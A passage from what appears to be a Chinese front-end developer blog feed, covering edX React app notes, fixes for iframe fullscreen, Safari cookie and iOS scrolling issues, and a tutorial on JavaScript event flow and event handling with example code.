Redux<br>当构建新UI的时候，应当使用React。但是现在绝大部分没有使用。上次edx年会说，2019年底会完成向react转移。</li></ul><p><br><br><em>一些新React App仓库</em><br>Account页  <a href="https://github.com/edx/frontend-app-account" target="_blank" rel="noopener">https://github.com/edx/frontend-app-account</a><br>Profile页  <a href="https://github.com/edx/frontend-app-profile" target="_blank" rel="noopener">https://github.com/edx/frontend-app-profile</a></p><ul><li>环境变量通过webpack.config中process.env配置</li><li>没有发现使用了UI库</li><li>使用redux,axios,mock</li><li>卡在了<code>Access to XMLHttpRequest at ’http://localhost:18000/api/user/v1/accounts/edx&#39; from origin ‘http://localhost:1997’ has been blocked by CORS policy: Request header field use-jwt-cookie is not allowed by Access-Control-Allow-Headers in preflight response.”</code><br>slack回复需更新master分支devstack。</li><li>一些已经多个react app用到的包<br>@edx/frontend-auth  统一处理登录<br>@edx/edx-bootstrap<br>@edx/frontend-component-footer</li></ul><p><br><br><em>publisher-frontend</em><br><a href="https://github.com/edx/publisher-frontend" target="_blank" rel="noopener">https://github.com/edx/publisher-frontend</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">路由                    对应组件              功能</span><br><span class="line">/courses/new           CreateCourse         新建课程，填写org, title, price,</span><br><span class="line">/courses/:id/rerun     CreateCourseRun</span><br><span class="line">/instructors/new       CreateStaffer        新建Staff,填写name,organization_id, bio, major_works</span><br><span class="line">/instructors/:uuid     EditStaffer</span><br><span class="line">/                      CourseDashboard      列表course name, course number, owner, modified</span><br><span class="line">/courses/:id           EditCourse           编辑课程 title, description, what will you learn, primary subject,course-image, about-video-link</span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="http://docs.edx.org/" target="_blank" rel="noopener">edx官方文档</a></li><li><a href="https://edx.readthedocs.io/projects/edx-installing-configuring-and-running/en/latest/configuration/changing_appearance/theming/index.html" target="_blank" rel="noopener">edx主题包官方文档</a></li><li><a href="https://github.com/edx/devstack" target="_blank" rel="noopener">安装edx H版</a></li><li><a href="https://blog.lawrencemcdaniel.com/how-to-change-the-open-edx-logo/" target="_blank" rel="noopener">How To Change the Open edX Logo</a></li><li><a href="https://open-edx-proposals.readthedocs.io/en/latest/oep-0011-bp-FED-technology.html" target="_blank" rel="noopener">OEP-11: Front End Technology Standards</a></li></ul>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>iframe的各种问题</title>
      <link href="/2019/04/30/iframe/"/>
      <url>/2019/04/30/iframe/</url>
      <content type="html"><![CDATA[<h3 id="1-视频无法全屏"><a href="#1-视频无法全屏" class="headerlink" title="1. 视频无法全屏"></a>1. 视频无法全屏</h3><p>使用video.js时，iframe内嵌视频无法全屏。 为iframe添加<code>allowfullscreen</code>属性即可<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"video.html"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">"0"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">"100%"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">"100%"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">scrolling</span>=<span class="string">"no"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">allowfullscreen</span>=<span class="string">"true"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">webkitallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag"><span class="attr">mozallowfullscreen</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-safari浏览器中iframe嵌套的页面无法保存cookie"><a href="#2-safari浏览器中iframe嵌套的页面无法保存cookie" class="headerlink" title="2. safari浏览器中iframe嵌套的页面无法保存cookie"></a>2. safari浏览器中iframe嵌套的页面无法保存cookie</h3><p>Safari 的安全策略太严格了，iframe 嵌套的网站的 cookie 被认为是不安全的，因此不允许保存，这就导致了用户即使在 iframe 中登录了网站，也无法保持登录状态，每次跳转页面之后就需要重新登录。 </p><p>解决方法：<br>强行把 iframe 的父级页面跳转到子页面所在的网站，然后设置好 session ，再重定向到父级页面，这时候设置的 cookie 就被认为是安全的了。 </p><p><br></p><h3 id="3-iframe在IOS手机上无法滚动"><a href="#3-iframe在IOS手机上无法滚动" class="headerlink" title="3. iframe在IOS手机上无法滚动"></a>3. iframe在IOS手机上无法滚动</h3><p>解决方法：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.iframe-outer</span>&#123;</span></span><br><span class="line"><span class="undefined">    position: fixed;</span></span><br><span class="line"><span class="undefined">    right: 0;</span></span><br><span class="line"><span class="undefined">    bottom: 0;</span></span><br><span class="line"><span class="undefined">    left: 0;</span></span><br><span class="line"><span class="undefined">    top: 0;</span></span><br><span class="line"><span class="undefined">    -webkit-overflow-scrolling: touch;</span></span><br><span class="line"><span class="undefined">    overflow-y: scroll;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"iframe-outer"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">"width: 100%; height: 100%; border: none; "</span></span></span><br><span class="line"><span class="tag">    <span class="attr">allowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">webkitallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">mozallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">""</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>事件流与事件处理程序</title>
      <link href="/2019/04/22/%E4%BA%8B%E4%BB%B6/"/>
      <url>/2019/04/22/%E4%BA%8B%E4%BB%B6/</url>
      <content type="html"><![CDATA[<blockquote><p>js与HTML之间的交互是通过事件实现的。可以使用侦听器来预订事件，以便事件发生时执行相应的代码，这种模式被称为观察者模式。</p></blockquote><p><br></p><h3 id="1-事件流"><a href="#1-事件流" class="headerlink" title="1. 事件流"></a>1. 事件流</h3><p>事件流描述的是从页面中接收事件的顺序。IE的事件流是事件冒泡流，而Netscape Communicator的事件流失事件捕获流。<br><img src="/2019/04/22/事件/1.png" style="max-width:500px; margin-top:20px"><br><br></p><ul><li><p><em>事件捕获</em><br>由不太具体的节点更早接收到事件，而最具体的节点最后接收到事件。事件捕获的用意在于，在事件到达预定目标之前捕获它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document -&gt; &lt;html&gt; -&gt; &lt;body&gt; -&gt; &lt;div&gt;</span><br></pre></td></tr></table></figure></li><li><p><em>事件冒泡</em><br>即事件开始时由最具体的元素（文档中嵌套层次最深的那个节点）接收，然后逐级向上传播到较为不具体的节点（文档）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;  -&gt;  &lt;body&gt;  -&gt; &lt;html&gt; -&gt; document</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="2-绑定事件"><a href="#2-绑定事件" class="headerlink" title="2. 绑定事件"></a>2. 绑定事件</h3><h4 id="2-1-lt-div-onclick-quot-quot-gt"><a href="#2-1-lt-div-onclick-quot-quot-gt" class="headerlink" title="2.1 &lt;div onclick=&quot;&quot;&gt;"></a>2.1 <code>&lt;div onclick=&quot;&quot;&gt;</code></h4><p>元素支持的每种事件，都可以使用一个与相应事件处理程序同名的HTML特性来制定。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"alert('clicked!')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onclick有权访问全局作用域中的任何代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"showMessage()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"try&#123;showMessage();&#125;catch(ex)&#123;&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>假设showMessage()函数是在按钮下方，页面的最底部定义的。如果用户在页面解析<code>showMessage()</code>之前就单机了按钮，就会引发错误。为此，很多HTML事件处理程序都会被装在一个try-catch块中。<br><br></p><h4 id="2-2-elem-onclick"><a href="#2-2-elem-onclick" class="headerlink" title="2.2 elem.onclick"></a>2.2 elem.onclick</h4><p>DOM0级事件绑定，使用<code>elem.onclick=function(){}</code>绑定事件，被认为是元素的方法。这时候，事件处理程序是在元素的作用域中进行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'myBtn'</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.id);   <span class="comment">// 'myBtn'，this引用当前元素</span></span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = <span class="literal">null</span>; <span class="comment">// 删除事件处理程序</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-addEventListener"><a href="#2-3-addEventListener" class="headerlink" title="2.3 addEventListener"></a>2.3 addEventListener</h4><p>DOM2级事件绑定: addEventListener() 和 removeEventListener()。接受3个参数：要处理的事件名，事件处理函数，和一个布尔值(true: 在捕获阶段调用事件， false: 在冒泡阶段调用)。为同一个元素添加两次addEventListener，两个事件会按添加顺序依次触发。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.id);</span><br><span class="line">&#125;</span><br><span class="line">btn.addEventListener(<span class="string">'click'</span>, handler, <span class="literal">false</span>)</span><br><span class="line">btn.removeEventListener(<span class="string">'click'</span>, handler, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-attachEvent"><a href="#2-4-attachEvent" class="headerlink" title="2.4 attachEvent"></a>2.4 attachEvent</h4><p>IE实现了两个类似的方法: attachEvent() 和 detachEvent()。与addEventListener不同，attachEvent，事件处理程序会在全局作用域中运行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span> === <span class="built_in">window</span>);   <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line">btn.attachEvent(<span class="string">'onclick'</span>, handler);</span><br><span class="line">btn.detachEvent(<span class="string">'onclick'</span>, handler);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-event对象"><a href="#3-event对象" class="headerlink" title="3. event对象"></a>3. event对象</h3><p>在触发dom上的某个事件时，会产生一个事件对象<em><code>event || window.event(IE)</code></em>，这个对象中包含着所有与事件有关的信息。包含导致事件的元素、事件的类型以及其他与特定事件相关的信息。如，鼠标操作导致的事件中，会包含鼠标位置的信息。键盘操作的事件中，会包含与按下的键有关的信息。</p><table><thead><tr><th>属性/方法</th><th style="text-align:center">值</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>bubbles</td><td style="text-align:center">Boolean</td><td style="text-align:right">事件是否冒泡</td></tr><tr><td>cancelable</td><td style="text-align:center">Boolean</td><td style="text-align:right">是否可以取消事件的默认行为</td></tr><tr><td>currentTarget</td><td style="text-align:center">Element</td><td style="text-align:right">当前正在处理事件的那个元素</td></tr><tr><td>defaultPrevented</td><td style="text-align:center">Boolean</td><td style="text-align:right">true,表示已经调用了preventDefautl()</td></tr><tr><td>detail</td><td style="text-align:center">Interger</td><td style="text-align:right">与事件相关的细节信息</td></tr><tr><td>eventPhase</td><td style="text-align:center">Interger</td><td style="text-align:right">调用事件处理程序的阶段：1-捕获阶段，2-处于目标，3-冒泡阶段</td></tr><tr><td>preventDefault()</td><td style="text-align:center">Function</td><td style="text-align:right">取消事件的默认行为</td></tr><tr><td>stopImmediatePropagation()</td><td style="text-align:center">Function</td><td style="text-align:right">取消事件的进一步捕获或冒泡，同时阻止任何事件处理程序被调用</td></tr><tr><td>stopPropagation()</td><td style="text-align:center">Function</td><td style="text-align:right">取消事件的进一步捕获或冒泡。如果bubbles为true，则可以使用这个方法</td></tr><tr><td>target</td><td style="text-align:center">Element</td><td style="text-align:right">事件的目标</td></tr><tr><td>trusted</td><td style="text-align:center">Boolean</td><td style="text-align:right">表明事件是浏览器生成的</td></tr><tr><td>type</td><td style="text-align:center">String</td><td style="text-align:right">被触发的事件的类型</td></tr><tr><td>view</td><td style="text-align:center">AbstractView</td><td style="text-align:right">与事件关联的抽象视图。等同于发生事件的window对象   </td></tr></tbody></table><p><br></p><h4 id="3-1-currentTarget-target"><a href="#3-1-currentTarget-target" class="headerlink" title="3.1 currentTarget, target"></a>3.1 currentTarget, target</h4><p><code>currentTarget</code>始终等于对象this的值，<code>target</code>则只包含事件的实际目标。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(event.currentTarget === <span class="built_in">document</span>.body);   <span class="comment">// true</span></span><br><span class="line">  alert(<span class="keyword">this</span> === <span class="built_in">document</span>.body);                  <span class="comment">// true</span></span><br><span class="line">  alert(event.target === <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>))  <span class="comment">// true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-event-type"><a href="#3-2-event-type" class="headerlink" title="3.2 event.type"></a>3.2 event.type</h4><p>在需要通过一个函数处理多个事件时，可以使用<em><code>type</code></em>属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(event.type)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"click"</span>:</span><br><span class="line">      alert(<span class="string">"clicked"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"mouseover"</span>:</span><br><span class="line">      event.target.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"mouseout"</span>:</span><br><span class="line">      event.target.style.backgroundColor = <span class="string">""</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = handler;</span><br><span class="line">btn.onmouseover = handler;</span><br><span class="line">btn.onmouseout = handler;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-event-preventDefault"><a href="#3-3-event-preventDefault" class="headerlink" title="3.3 event.preventDefault()"></a>3.3 event.preventDefault()</h4><p>阻止特定事件的默认行为，例如<code>&lt;a&gt;</code>被单击时会导航到其href特性指定的URL。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取消了链接导航这一默认行为</span></span><br><span class="line">link.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event.prevenDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-stopPropagation"><a href="#3-4-stopPropagation" class="headerlink" title="3.4 stopPropagation()"></a>3.4 stopPropagation()</h4><p>立即停止事件在DOM层次中的传播，取消进一步的事件捕获或冒泡。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在按钮上调用stopPropagation()，从而避免触发注册在document.body上面的事件</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Clicked"</span>);</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Body clicked"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-5-IE中的event"><a href="#3-5-IE中的event" class="headerlink" title="3.5 IE中的event"></a>3.5 IE中的event</h4><table><thead><tr><th>属性/方法</th><th style="text-align:center">值</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>cancelBubble</td><td style="text-align:center">Boolean</td><td style="text-align:right">默认为false,设置为true可以取消事件冒泡</td></tr><tr><td>returnValue</td><td style="text-align:center">Boolean</td><td style="text-align:right">默认为true,设置为false可以取消事件的默认行为</td></tr><tr><td>srcElement</td><td style="text-align:center">Element</td><td style="text-align:right">事件的目标(与DOM的target属性相同)</td></tr><tr><td>type</td><td style="text-align:center">String</td><td style="text-align:right">事件的类型</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function的作用域是根据指定它的方式来确定的，不能认为this始终等于事件目标。用event.srcElement比较保险</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="built_in">window</span>.event.srcElement === <span class="keyword">this</span>);  <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line">btn.attachEvent(<span class="string">"onclick"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(event.srcElement === <span class="keyword">this</span>);  <span class="comment">// false</span></span><br><span class="line">  <span class="built_in">window</span>.event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-6-event-clientX-pageX-screenX"><a href="#3-6-event-clientX-pageX-screenX" class="headerlink" title="3.6 event.clientX, pageX,screenX"></a>3.6 event.clientX, pageX,screenX</h4><p>得知事件发生的坐标。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 浏览器视口中的特定位置上发生</span></span><br><span class="line">  alert(<span class="string">'Client coordinates:'</span> + event.clientX + event.clientY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在页面中的位置,页面没有滚动的情况下,pageX和clientX相等</span></span><br><span class="line">  alert(<span class="string">'Page coordinates:'</span> + event.pageX + event.pageY);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 相对于整个电脑屏幕的位置</span></span><br><span class="line">  alert(<span class="string">'Screen coordinates:'</span> + event.screenX + event.screenY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-7-修改键"><a href="#3-7-修改键" class="headerlink" title="3.7 修改键"></a>3.7 修改键</h4><p>在按下鼠标键盘上的某些键的状态也可以影响到所要采取的操作。这些修改键是shift, ctrl, alt和meta(windows里是windows键，苹果梨是cmd键)。DOM定义了4个属性，来表示这些修改键的状态: shiftKey, ctrlKey, altKey, metaKey(Boolean值)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.shiftKey)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-跨浏览器绑定事件"><a href="#4-跨浏览器绑定事件" class="headerlink" title="4. 跨浏览器绑定事件"></a>4. 跨浏览器绑定事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventUtil = &#123;</span><br><span class="line">  addHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">"on"</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEventListener) &#123;</span><br><span class="line">      element.removeEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">"on"</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  getEvent: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event ? event : <span class="built_in">window</span>.event;</span><br><span class="line">  &#125;,</span><br><span class="line">  getTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line">  preventDefault: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault)&#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  stopPropagation: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.stopPropagation)&#123;</span><br><span class="line">      event.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><br><br></p><h3 id="5-事件类型"><a href="#5-事件类型" class="headerlink" title="5. 事件类型"></a>5. 事件类型</h3><h4 id="5-1-load"><a href="#5-1-load" class="headerlink" title="5.1 load"></a>5.1 load</h4><p><code>window.load</code>当页面完全加载完后(包括所有图像，js文件，css文件等外部资源)，就会触发window上的load事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Loaded"</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&lt;body onload=<span class="string">"alert('Loaded')"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>图像上也可以触发load事件,图像加载完毕后触发事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(imgElem, <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"image loaded"</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&lt;img src=<span class="string">"1.jpg"</span> onload=<span class="string">"alert('image loaded')"</span>&gt;</span><br></pre></td></tr></table></figure></p><p><code>&lt;script&gt;</code>元素也会触发load事件，以便确定动态加载的js文件是否加载完毕。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">script.src = <span class="string">"1.js"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-焦点事件"><a href="#5-2-焦点事件" class="headerlink" title="5.2 焦点事件"></a>5.2 焦点事件</h4><p>焦点事件会在页面元素获得或失去焦点时触发。利用这些事件与<code>document.hasFocus()</code>及<code>document.activeElement</code>属性配合，可以知晓用户在页面上的行踪。</p><ul><li>document.hasFocus()</li><li>document.activeElement</li><li>focus: 